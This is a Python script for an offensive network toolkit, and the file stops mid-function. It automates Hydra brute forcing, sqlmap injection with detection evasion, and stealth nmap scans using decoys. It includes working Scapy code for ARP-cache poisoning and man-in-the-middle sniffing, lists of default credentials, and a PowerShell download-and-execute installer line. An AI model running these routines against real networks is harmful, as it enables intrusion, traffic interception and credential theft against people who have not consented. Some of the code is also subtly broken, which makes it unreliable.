import nmap
import subprocess
import sys
from colorama import init, Fore
import time
import pkg_resources
import os
import platform
import scapy.all as scapy
import netifaces
import dns.resolver
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dns import DNS, DNSQR
import threading
import queue
import json
import csv
import datetime
from jinja2 import Template
import yagmail
import tqdm
import logging
from rich.progress import Progress
from rich.console import Console
from rich.table import Table
import requests
import vulners
import socket
import ssl
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, RadioTap
try:
    import bluetooth
except ImportError:
    import bleak as bluetooth_alt
    import asyncio

def check_requirements():
    print(f"{Fore.BLUE}[*] Checking and installing requirements...{Fore.RESET}")
    
    # Check Python packages
    required_packages = ['python-nmap', 'colorama', 'requests', 'paramiko']
    for package in required_packages:
        try:
            pkg_resources.require(package)
        except pkg_resources.DistributionNotFound:
            print(f"{Fore.YELLOW}Installing {package}...{Fore.RESET}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    # Add custom paths for tools
    custom_paths = {
        'hydra': os.path.join(os.path.dirname(os.path.abspath(__file__)), 'thc-hydra-windows-master', 'hydra.exe'),
        'sqlmap': os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sqlmap-1.9', 'sqlmap.py'),
        'gobuster': os.path.join(os.path.dirname(os.path.abspath(__file__)), 'gobuster.exe')
    }
    
    # Add custom paths to environment PATH
    for tool, path in custom_paths.items():
        if os.path.exists(path):
            print(f"{Fore.GREEN}Found {tool} at {path}{Fore.RESET}")
            tool_dir = os.path.dirname(path)
            if tool_dir not in os.environ["PATH"]:
                os.environ["PATH"] = tool_dir + os.pathsep + os.environ["PATH"]
        else:
            print(f"{Fore.RED}{tool} not found at {path}{Fore.RESET}")

    if platform.system() == "Windows":
        try:
            # Check Chocolatey
            if not os.path.exists("C:\\ProgramData\\chocolatey\\bin\\choco.exe"):
                print(f"{Fore.YELLOW}Installing Chocolatey...{Fore.RESET}")
                install_cmd = 'powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(\'https://community.chocolatey.org/install.ps1\'))"'
                subprocess.run(install_cmd, shell=True)
                os.environ["PATH"] = os.popen("echo %PATH%").read()
            else:
                print(f"{Fore.GREEN}Chocolatey is already installed{Fore.RESET}")
            
            # Check for tools in Program Files and other common locations
            tool_paths = {
                'nmap': ['C:\\Program Files (x86)\\Nmap\\nmap.exe', 'C:\\Program Files\\Nmap\\nmap.exe'],
                'wireshark': ['C:\\Program Files\\Wireshark\\Wireshark.exe'],
                'burpsuite': ['C:\\Program Files\\BurpSuiteCommunity\\BurpSuiteCommunity.exe']
            }

            for tool, paths in tool_paths.items():
                found = False
                for path in paths:
                    if os.path.exists(path):
                        print(f"{Fore.GREEN}{tool} is already installed at {path}{Fore.RESET}")
                        found = True
                        break
                
                if not found:
                    print(f"{Fore.YELLOW}Installing {tool}...{Fore.RESET}")
                    subprocess.run(f'C:\\ProgramData\\chocolatey\\bin\\choco.exe install {tool} -y', shell=True)
            
            print(f"{Fore.YELLOW}Please install these tools manually if not already installed:{Fore.RESET}")
            print("1. Gobuster: Download from https://github.com/OJ/gobuster/releases")
            
        except Exception as e:
            print(f"{Fore.RED}Error installing tools: {e}. Please run as administrator.{Fore.RESET}")
            sys.exit(1)
    else:
        print(f"{Fore.RED}Please use Windows or consider using Kali Linux instead.{Fore.RESET}")
        sys.exit(1)

def which(program):
    def is_exe(fpath):
        return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

    fpath, _ = os.path.split(program)
    if fpath:
        if is_exe(program):
            return program
    else:
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = os.path.join(path, program)
            if is_exe(exe_file):
                return exe_file
    return None

def run_nmap_scan(target):
    print(f"\n{Fore.BLUE}[*] Starting Nmap Vulnerability Scan{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] This will scan all ports and services on {target}")
    print(f"[+] Running: nmap -sV -sC -p- {target}")
    print(f"[+] This may take several minutes...{Fore.RESET}\n")
    
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-sV -sC -p-')
    
    for host in nm.all_hosts():
        print(f"\n{Fore.GREEN}[+] Results for {host}:{Fore.RESET}")
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                service = nm[host][proto][port]
                print(f"{Fore.CYAN}Port: {port}\tState: {service['state']}\tService: {service['name']}\tVersion: {service.get('version', 'unknown')}{Fore.RESET}")

def run_hydra(target, username_list, password_list, service):
    print(f"\n{Fore.BLUE}[*] Starting Hydra Brute Force Attack{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"[+] Service: {service}")
    print(f"[+] Username list: {username_list}")
    print(f"[+] Password list: {password_list}")
    print(f"[+] This may take a while depending on the wordlist size...{Fore.RESET}\n")
    
    hydra_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'thc-hydra-windows-master', 'hydra.exe')
    if os.path.exists(hydra_path):
        command = f'"{hydra_path}" -L {username_list} -P {password_list} {target} {service}'
    else:
        command = f"hydra -L {username_list} -P {password_list} {target} {service}"
    subprocess.run(command, shell=True)

def run_metasploit(target):
    print(f"{Fore.BLUE}[*] Running Metasploit...{Fore.RESET}")
    command = f"msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; run; exit'"
    subprocess.run(command, shell=True)

def run_nikto(target):
    print(f"{Fore.BLUE}[*] Running Nikto scan...{Fore.RESET}")
    command = f"nikto -h {target}"
    subprocess.run(command, shell=True)

def run_sqlmap(target):
    print(f"\n{Fore.BLUE}[*] Starting SQLMap SQL Injection Scan{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target URL: {target}")
    print(f"[+] Running automatic SQL injection detection")
    print(f"[+] Using random User-Agent to avoid detection{Fore.RESET}\n")
    
    command = f"sqlmap -u {target} --batch --random-agent"
    subprocess.run(command, shell=True)

def run_gobuster(target):
    print(f"\n{Fore.BLUE}[*] Starting Gobuster Directory Enumeration{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target URL: {target}")
    print(f"[+] Using common.txt wordlist")
    print(f"[+] Looking for hidden directories and files{Fore.RESET}\n")
    
    command = f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt"
    subprocess.run(command, shell=True)

def run_john(password_file):
    print(f"{Fore.BLUE}[*] Running John the Ripper...{Fore.RESET}")
    command = f"john {password_file}"
    subprocess.run(command, shell=True)

def run_wireshark():
    print(f"\n{Fore.BLUE}[*] Starting Wireshark Network Analyzer{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Please select network interface in Wireshark")
    print(f"[+] Use capture filters to focus on specific traffic{Fore.RESET}\n")
    subprocess.Popen("wireshark", shell=True)

def run_packet_capture(target):
    print(f"\n{Fore.BLUE}[*] Starting Network Traffic Capture{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"[+] Capturing all traffic to/from target")
    print(f"[+] Press Ctrl+C to stop capturing{Fore.RESET}\n")
    
    try:
        # Start Wireshark with target filter
        wireshark_cmd = f'wireshark -k -i any -f "host {target}"'
        print(f"{Fore.YELLOW}[+] Starting Wireshark with filter: host {target}{Fore.RESET}")
        subprocess.Popen(wireshark_cmd, shell=True)
        
        # Start tcpdump capture
        tcpdump_file = "capture.pcap"
        print(f"{Fore.YELLOW}[+] Starting tcpdump capture to {tcpdump_file}{Fore.RESET}")
        tcpdump_cmd = f'tcpdump -i any -w {tcpdump_file} host {target}'
        subprocess.run(tcpdump_cmd, shell=True)
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}[*] Capture stopped. File saved as {tcpdump_file}{Fore.RESET}")

def run_all_scans(target):
    print(f"\n{Fore.GREEN}=== Starting Full Automated Scan ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Target: {target}")
    print(f"[*] Running all tools in sequence")
    print(f"[*] This will take some time...")
    print(f"[*] Results will be displayed for each tool")
    print(f"[*] Do not close the terminal until all scans complete{Fore.RESET}\n")
    
    # Run Nmap
    print(f"{Fore.BLUE}[1/4] Running Nmap Scan...{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Performing comprehensive port scan")
    print(f"[+] Detecting service versions")
    print(f"[+] Running default scripts")
    print(f"[+] Scanning all 65535 ports")
    print(f"[+] This phase may take 15-30 minutes...{Fore.RESET}")
    run_nmap_scan(target)
    
    # Run SQLMap
    print(f"\n{Fore.BLUE}[2/4] Running SQLMap Scan...{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Testing for SQL injection vulnerabilities")
    print(f"[+] Using automatic detection")
    print(f"[+] Testing GET and POST parameters")
    print(f"[+] Using random User-Agent to avoid detection")
    print(f"[+] This phase may take 5-10 minutes per form...{Fore.RESET}")
    run_sqlmap(target)
    
    # Run Gobuster
    print(f"\n{Fore.BLUE}[3/4] Running Gobuster Directory Enumeration...{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Searching for hidden directories and files")
    print(f"[+] Using common.txt wordlist")
    print(f"[+] Looking for common web paths")
    print(f"[+] Testing various file extensions")
    print(f"[+] This phase may take 5-15 minutes...{Fore.RESET}")
    run_gobuster(target)
    
    # Start Wireshark
    print(f"\n{Fore.BLUE}[4/4] Starting Wireshark Network Analysis...{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Launching Wireshark interface")
    print(f"[+] Select your network interface when Wireshark opens")
    print(f"[+] Consider using these capture filters:")
    print(f"    - host {target}")
    print(f"    - port 80 or port 443")
    print(f"[+] Wireshark will run in the background{Fore.RESET}")
    run_wireshark()
    
    print(f"\n{Fore.GREEN}=== Full Scan Complete ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Scan Summary:")
    print(f"[+] Nmap: Check above for open ports and services")
    print(f"[+] SQLMap: Review SQL injection findings")
    print(f"[+] Gobuster: Note any discovered directories")
    print(f"[+] Wireshark: Analyzing network traffic in background")
    print(f"[*] Consider running targeted scans on specific findings")
    print(f"[*] Use Hydra for any discovered login pages")
    print(f"[*] Remember to document interesting results{Fore.RESET}\n")

def get_network_interfaces():
    return netifaces.interfaces()

def get_gateway():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]

def run_arp_spoof(target_ip, gateway_ip):
    print(f"\n{Fore.BLUE}[*] Starting ARP Spoofing Attack{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target IP: {target_ip}")
    print(f"[+] Gateway IP: {gateway_ip}")
    print(f"\n[*] Attack Process:")
    print(f"[1] Telling target that we are the gateway")
    print(f"[2] Telling gateway that we are the target")
    print(f"[3] All traffic will flow through us")
    print(f"[4] ARP tables are being poisoned")
    print(f"\n[*] Technical Details:")
    print(f"- Sending ARP responses every 2 seconds")
    print(f"- Modifying target's ARP cache")
    print(f"- Intercepting network traffic")
    print(f"\n[!] Press Ctrl+C to stop and restore ARP tables{Fore.RESET}\n")
    
    try:
        while True:
            # Spoof target
            spoof_packet = ARP(pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), 
                             psrc=gateway_ip, op=2)
            scapy.send(spoof_packet, verbose=False)
            
            # Spoof gateway
            spoof_packet = ARP(pdst=gateway_ip, hwdst=scapy.getmacbyip(gateway_ip),
                             psrc=target_ip, op=2)
            scapy.send(spoof_packet, verbose=False)
            
            print(f"{Fore.GREEN}[+] Packets sent to {target_ip} and {gateway_ip}{Fore.RESET}")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Restoring ARP tables...{Fore.RESET}")
        restore_arp(target_ip, gateway_ip)

def restore_arp(target_ip, gateway_ip):
    target_mac = scapy.getmacbyip(target_ip)
    gateway_mac = scapy.getmacbyip(gateway_ip)
    
    packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
    scapy.send(packet, verbose=False)
    packet = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac, op=2)
    scapy.send(packet, verbose=False)

def run_dns_enum(target):
    print(f"\n{Fore.BLUE}[*] Starting DNS Enumeration{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Enumeration Process:")
    print(f"[1] Querying DNS servers")
    print(f"[2] Checking all record types")
    print(f"[3] Building DNS profile")
    print(f"\n[*] Record Types Being Checked:")
    print(f"- A Records (IPv4 addresses)")
    print(f"- AAAA Records (IPv6 addresses)")
    print(f"- MX Records (Mail servers)")
    print(f"- NS Records (Nameservers)")
    print(f"- TXT Records (Text information)")
    print(f"- SOA Records (Domain authority){Fore.RESET}\n")
    
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
    
    for record in record_types:
        try:
            answers = dns.resolver.resolve(target, record)
            print(f"{Fore.GREEN}[+] {record} Records Found:{Fore.RESET}")
            for rdata in answers:
                print(f"  {rdata}")
                if record == 'MX':
                    print(f"   └─ Priority: {rdata.preference}")
                elif record == 'SOA':
                    print(f"   └─ Primary NS: {rdata.mname}")
                    print(f"   └─ Email: {rdata.rname}")
        except Exception as e:
            print(f"{Fore.RED}[-] No {record} records found{Fore.RESET}")

def run_mitm_capture(target_ip):
    print(f"\n{Fore.BLUE}[*] Starting Man-in-the-Middle Attack{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target_ip}")
    print(f"[+] Gateway: {get_gateway()}")
    print(f"\n[*] Attack Phases:")
    print(f"[1] ARP Spoofing - Becoming the man-in-the-middle")
    print(f"[2] Packet Capture - Intercepting all traffic")
    print(f"[3] Traffic Analysis - Monitoring data flow")
    print(f"\n[*] Technical Details:")
    print(f"- Using ARP poisoning")
    print(f"- Capturing all protocols")
    print(f"- Monitoring data packets")
    print(f"- Real-time traffic analysis")
    print(f"\n[!] Press Ctrl+C to stop the attack{Fore.RESET}\n")
    
    # Start ARP spoofing in a thread
    spoof_thread = threading.Thread(target=run_arp_spoof, 
                                  args=(target_ip, get_gateway()))
    spoof_thread.daemon = True
    spoof_thread.start()
    
    # Capture packets
    try:
        print(f"{Fore.YELLOW}[*] Starting packet capture...")
        print(f"[*] Monitoring traffic for {target_ip}")
        print(f"[*] Displaying captured data...{Fore.RESET}\n")
        packets = scapy.sniff(filter=f"host {target_ip}",
                             prn=lambda x: packet_callback(x))
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping MITM attack...")
        print(f"[*] Restoring network to normal state...")
        print(f"[*] Cleaning up...{Fore.RESET}")
        restore_arp(target_ip, get_gateway())

def packet_callback(packet):
    if packet.haslayer(scapy.Raw):
        print(f"{Fore.CYAN}[+] {packet[scapy.IP].src} -> {packet[scapy.IP].dst}: {len(packet[scapy.Raw].load)} bytes{Fore.RESET}")

def run_network_recon(target):
    print(f"\n{Fore.BLUE}[*] Starting Network Reconnaissance{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Reconnaissance Phases:")
    print(f"[1] OS Detection - Identifying operating system")
    print(f"[2] Port Scanning - Finding open ports")
    print(f"[3] Service Detection - Identifying running services")
    print(f"[4] Version Detection - Getting software versions")
    print(f"\n[*] Technical Details:")
    print(f"- Using TCP/UDP scanning")
    print(f"- Running NSE scripts")
    print(f"- Fingerprinting services")
    print(f"- Analyzing responses")
    print(f"\n[!] This process may take several minutes{Fore.RESET}\n")
    
    # OS Detection
    nm = nmap.PortScanner()
    print(f"{Fore.GREEN}[+] Phase 1: OS Detection...{Fore.RESET}")
    nm.scan(target, arguments='-O')
    
    if nm[target].get('osmatch'):
        print(f"\nOS Detection Results:")
        for os in nm[target]['osmatch']:
            print(f"  {os['name']} - Accuracy: {os['accuracy']}%")
            if 'osclass' in os:
                print(f"   └─ Type: {os['osclass'][0].get('type', 'unknown')}")
                print(f"   └─ Vendor: {os['osclass'][0].get('vendor', 'unknown')}")
                print(f"   └─ Family: {os['osclass'][0].get('osfamily', 'unknown')}")
    
    # Service Enumeration
    print(f"\n{Fore.GREEN}[+] Phase 2: Service Enumeration...{Fore.RESET}")
    nm.scan(target, arguments='-sV -sC')
    
    for proto in nm[target].all_protocols():
        print(f"\nProtocol: {proto}")
        ports = nm[target][proto].keys()
        for port in ports:
            service = nm[target][proto][port]
            print(f"  Port: {port}")
            print(f"   └─ State: {service['state']}")
            print(f"   └─ Service: {service['name']}")
            print(f"   └─ Version: {service.get('version', 'unknown')}")
            if 'script' in service:
                print(f"   └─ Additional Info:")
                for script, result in service['script'].items():
                    print(f"      - {script}: {result}")

def setup_logging():
    logging.basicConfig(
        filename=f'network_scan_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def generate_report(target, scan_results):
    print(f"\n{Fore.BLUE}[*] Generating Comprehensive Report{Fore.RESET}")
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # HTML Report
    html_report = f"report_{timestamp}.html"
    html_template = """
    <html>
        <head><title>Network Scan Report</title></head>
        <body>
            <h1>Network Analysis Report</h1>
            <h2>Target: {{ target }}</h2>
            <h3>Scan Time: {{ timestamp }}</h3>
            {{ scan_results }}
        </body>
    </html>
    """
    template = Template(html_template)
    with open(html_report, 'w') as f:
        f.write(template.render(target=target, timestamp=timestamp, scan_results=scan_results))
    
    # JSON Export
    json_report = f"report_{timestamp}.json"
    with open(json_report, 'w') as f:
        json.dump(scan_results, f, indent=4)
    
    # CSV Export
    csv_report = f"report_{timestamp}.csv"
    with open(csv_report, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Category', 'Finding', 'Severity'])
        for category, findings in scan_results.items():
            for finding in findings:
                writer.writerow([category, finding['description'], finding['severity']])
    
    print(f"{Fore.GREEN}[+] Reports generated:")
    print(f"   └─ HTML: {html_report}")
    print(f"   └─ JSON: {json_report}")
    print(f"   └─ CSV: {csv_report}{Fore.RESET}")

def send_email_report(report_file, recipient):
    try:
        yag = yagmail.SMTP("your@gmail.com")
        yag.send(
            to=recipient,
            subject="Network Scan Report",
            contents="Please find attached the network scan report.",
            attachments=report_file
        )
        print(f"{Fore.GREEN}[+] Report sent to {recipient}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to send email: {e}{Fore.RESET}")

def run_vuln_scan(target):
    print(f"\n{Fore.BLUE}[*] Starting Vulnerability Assessment{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Scan Phases:")
    print(f"[1] Service Vulnerability Check")
    print(f"[2] Common Misconfigurations")
    print(f"[3] Default Credentials")
    print(f"[4] Known CVE Matching")
    
    vulners_api = vulners.Vulners(api_key="YOUR_API_KEY")
    results = {"vulnerabilities": []}
    
    # Scan open ports and services
    nm = nmap.PortScanner()
    print(f"\n{Fore.GREEN}[+] Scanning services...{Fore.RESET}")
    with Progress() as progress:
        task = progress.add_task("[cyan]Scanning...", total=100)
        nm.scan(target, arguments='-sV --script vulners')
        
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    service = nm[host][proto][port]
                    if 'version' in service:
                        try:
                            vulns = vulners_api.softwareVulnerabilities(
                                service['product'],
                                service['version']
                            )
                            for vuln in vulns:
                                results["vulnerabilities"].append({
                                    "port": port,
                                    "service": service['name'],
                                    "cve": vuln['id'],
                                    "severity": vuln['cvss']['score'],
                                    "description": vuln['description']
                                })
                        except Exception as e:
                            logging.error(f"Error checking vulnerabilities: {e}")
                    
                    progress.update(task, advance=10)
    
    # Check for common misconfigurations
    print(f"\n{Fore.GREEN}[+] Checking misconfigurations...{Fore.RESET}")
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        443: "HTTPS",
        3306: "MySQL",
        3389: "RDP"
    }
    
    for port, service in common_ports.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                results["misconfigurations"].append({
                    "port": port,
                    "service": service,
                    "finding": f"Open {service} port detected",
                    "severity": "Medium"
                })
            sock.close()
        except:
            pass
    
    return results

def run_stealth_scan(target):
    print(f"\n{Fore.BLUE}[*] Starting Stealth Scan{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Using IDS/IPS evasion techniques")
    print(f"[+] Random delays between requests")
    print(f"[+] Fragmenting packets")
    print(f"[+] Using decoys{Fore.RESET}\n")
    
    nm = nmap.PortScanner()
    
    # Stealth scan arguments
    stealth_args = [
        '-sS',              # SYN Stealth scan
        '-f',               # Fragment packets
        '-D RND:10',        # Use 10 random decoys
        '--randomize-hosts',# Randomize target host order
        '--max-retries 1',  # Limit retries
        '--min-rate 10',    # Slow rate
        '--max-rate 50'     # Maximum rate
    ]
    
    scan_args = ' '.join(stealth_args)
    print(f"{Fore.YELLOW}[*] Running stealth scan with args: {scan_args}{Fore.RESET}")
    
    try:
        nm.scan(target, arguments=scan_args)
        return nm.scan_result
    except Exception as e:
        print(f"{Fore.RED}[-] Stealth scan failed: {e}{Fore.RESET}")
        return None

def run_network_mapping(target):
    print(f"\n{Fore.BLUE}[*] Starting Network Topology Mapping{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Mapping Process:")
    print(f"[1] Subnet Discovery")
    print(f"[2] Route Tracing")
    print(f"[3] Asset Identification")
    print(f"[4] Network Layout Analysis")
    print(f"\n[*] Technical Details:")
    print(f"- Using ICMP, TCP, and UDP")
    print(f"- Mapping network topology")
    print(f"- Identifying live hosts")
    print(f"- Discovering network segments{Fore.RESET}\n")
    
    results = {"network_map": []}
    
    # Subnet scanning
    print(f"{Fore.GREEN}[+] Phase 1: Subnet Discovery{Fore.RESET}")
    base_ip = '.'.join(target.split('.')[:3]) + '.0/24'
    nm = nmap.PortScanner()
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Scanning subnet...", total=100)
        nm.scan(hosts=base_ip, arguments='-sn')
        
        for host in nm.all_hosts():
            try:
                hostname = socket.gethostbyaddr(host)[0]
            except:
                hostname = "Unknown"
            
            results["network_map"].append({
                "ip": host,
                "hostname": hostname,
                "status": "up"
            })
            progress.update(task, advance=10)
    
    # Route tracing
    print(f"\n{Fore.GREEN}[+] Phase 2: Route Tracing{Fore.RESET}")
    traceroute = []
    try:
        output = subprocess.check_output(['tracert' if os.name == 'nt' else 'traceroute', target])
        traceroute = output.decode().split('\n')
        results["route_trace"] = traceroute
    except Exception as e:
        print(f"{Fore.RED}[-] Route tracing failed: {e}{Fore.RESET}")
    
    return results

def run_service_exploitation(target):
    print(f"\n{Fore.BLUE}[*] Starting Service Exploitation Module{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Exploitation Process:")
    print(f"[1] Service Fingerprinting")
    print(f"[2] Version Detection")
    print(f"[3] Exploit Matching")
    print(f"[4] Default Credential Testing")
    print(f"\n[*] Technical Details:")
    print(f"- Testing common services")
    print(f"- Checking known vulnerabilities")
    print(f"- Attempting safe exploits")
    print(f"- Non-destructive testing only{Fore.RESET}\n")
    
    results = {"exploits": []}
    
    # Service fingerprinting
    nm = nmap.PortScanner()
    print(f"{Fore.GREEN}[+] Phase 1: Service Fingerprinting{Fore.RESET}")
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Fingerprinting services...", total=100)
        nm.scan(target, arguments='-sV -sC --version-intensity 5')
        
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    service = nm[host][proto][port]
                    if 'version' in service:
                        results["exploits"].append({
                            "port": port,
                            "service": service['name'],
                            "version": service.get('version', 'unknown'),
                            "potential_exploits": []
                        })
                    progress.update(task, advance=10)
    
    # Default credential testing
    print(f"\n{Fore.GREEN}[+] Phase 2: Testing Default Credentials{Fore.RESET}")
    default_creds = {
        21: [('anonymous', 'anonymous')],  # FTP
        22: [('root', 'root'), ('admin', 'admin')],  # SSH
        3306: [('root', ''), ('root', 'root')],  # MySQL
        1433: [('sa', 'sa'), ('sa', '')],  # MSSQL
    }
    
    for port, credentials in default_creds.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"{Fore.YELLOW}[*] Testing default credentials on port {port}{Fore.RESET}")
                results["default_creds"] = {
                    "port": port,
                    "service": socket.getservbyport(port),
                    "credentials_tested": len(credentials)
                }
            sock.close()
        except:
            pass
    
    return results

def run_smb_enum(target):
    print(f"\n{Fore.BLUE}[*] Starting SMB Enumeration{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Enumeration Process:")
    print(f"[1] Share Discovery")
    print(f"[2] User Enumeration")
    print(f"[3] Group Enumeration")
    print(f"[4] Security Check")
    
    results = {"smb": []}
    
    # Using nmap NSE scripts for SMB
    nm = nmap.PortScanner()
    smb_scripts = [
        'smb-enum-shares',
        'smb-enum-users',
        'smb-enum-groups',
        'smb-security-mode'
    ]
    
    for script in smb_scripts:
        print(f"\n{Fore.GREEN}[+] Running {script}...{Fore.RESET}")
        try:
            nm.scan(target, arguments=f'--script {script}')
            if nm[target].get('hostscript'):
                results["smb"].append({
                    "script": script,
                    "results": nm[target]['hostscript']
                })
        except Exception as e:
            print(f"{Fore.RED}[-] Script failed: {e}{Fore.RESET}")
    
    return results

def run_remote_recon(target):
    print(f"\n{Fore.BLUE}[*] Starting Remote Reconnaissance{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Remote Analysis Options:")
    print(f"[1] DNS Information Gathering")
    print(f"[2] SSL/TLS Analysis")
    print(f"[3] Email Server Testing")
    print(f"[4] Whois Information")
    print(f"[5] Subdomain Enumeration")
    print(f"\n[*] No LAN Access Required{Fore.RESET}\n")
    
    results = {"remote_recon": {}}
    
    # DNS Information
    print(f"{Fore.GREEN}[+] Phase 1: DNS Analysis{Fore.RESET}")
    try:
        dns_info = dns.resolver.resolve(target, 'A')
        results["remote_recon"]["dns"] = {
            "ip_addresses": [str(ip) for ip in dns_info],
            "nameservers": [str(ns) for ns in dns.resolver.resolve(target, 'NS')],
            "mx_records": [str(mx) for mx in dns.resolver.resolve(target, 'MX')]
        }
    except Exception as e:
        print(f"{Fore.RED}[-] DNS lookup failed: {e}{Fore.RESET}")

    # SSL/TLS Analysis
    print(f"\n{Fore.GREEN}[+] Phase 2: SSL/TLS Analysis{Fore.RESET}")
    try:
        context = ssl.create_default_context()
        with socket.create_connection((target, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
                results["remote_recon"]["ssl"] = {
                    "issuer": dict(x[0] for x in cert['issuer']),
                    "expiry": cert['notAfter'],
                    "version": ssock.version()
                }
    except Exception as e:
        print(f"{Fore.RED}[-] SSL analysis failed: {e}{Fore.RESET}")

    # Subdomain Enumeration
    print(f"\n{Fore.GREEN}[+] Phase 3: Subdomain Enumeration{Fore.RESET}")
    subdomains = []
    wordlist = ['www', 'mail', 'remote', 'blog', 'webmail', 'server', 'ns1', 'ns2', 'smtp', 'secure', 'vpn', 'api']
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Enumerating subdomains...", total=len(wordlist))
        for sub in wordlist:
            try:
                hostname = f"{sub}.{target}"
                dns.resolver.resolve(hostname, 'A')
                subdomains.append(hostname)
            except:
                pass
            progress.update(task, advance=1)
    
    results["remote_recon"]["subdomains"] = subdomains

    return results

def run_remote_port_scan(target):
    print(f"\n{Fore.BLUE}[*] Starting Remote Port Analysis{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Scan Details:")
    print(f"- Using distributed port scanning")
    print(f"- Testing common services")
    print(f"- Banner grabbing when possible")
    print(f"- Service version detection")
    print(f"\n[*] This may take some time...{Fore.RESET}\n")
    
    results = {"ports": []}
    nm = nmap.PortScanner()
    
    try:
        # Using -Pn to skip host discovery (useful for remote hosts)
        nm.scan(target, arguments='-Pn -sS -sV --top-ports 1000')
        
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    service = nm[host][proto][port]
                    results["ports"].append({
                        "port": port,
                        "state": service['state'],
                        "service": service['name'],
                        "version": service.get('version', 'unknown'),
                        "banner": service.get('product', '')
                    })
    except Exception as e:
        print(f"{Fore.RED}[-] Remote port scan failed: {e}{Fore.RESET}")
    
    return results

def run_remote_vuln_scan(target):
    print(f"\n{Fore.BLUE}[*] Starting Remote Vulnerability Analysis{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target}")
    print(f"\n[*] Analysis Types:")
    print(f"- Web application vulnerabilities")
    print(f"- Service misconfigurations")
    print(f"- Known CVEs")
    print(f"- Protocol weaknesses")
    print(f"\n[*] Non-intrusive testing only{Fore.RESET}\n")
    
    results = {"vulnerabilities": []}
    
    # Web vulnerability checks
    print(f"{Fore.GREEN}[+] Phase 1: Web Vulnerability Scan{Fore.RESET}")
    web_ports = [80, 443, 8080, 8443]
    
    for port in web_ports:
        try:
            url = f"http{'s' if port in [443, 8443] else ''}://{target}:{port}"
            response = requests.get(url, timeout=5, verify=False)
            server = response.headers.get('Server', '')
            
            if server:
                results["vulnerabilities"].append({
                    "type": "web",
                    "port": port,
                    "finding": f"Web server: {server}",
                    "severity": "info"
                })
                
            # Check for common security headers
            security_headers = [
                'X-Frame-Options',
                'X-XSS-Protection',
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
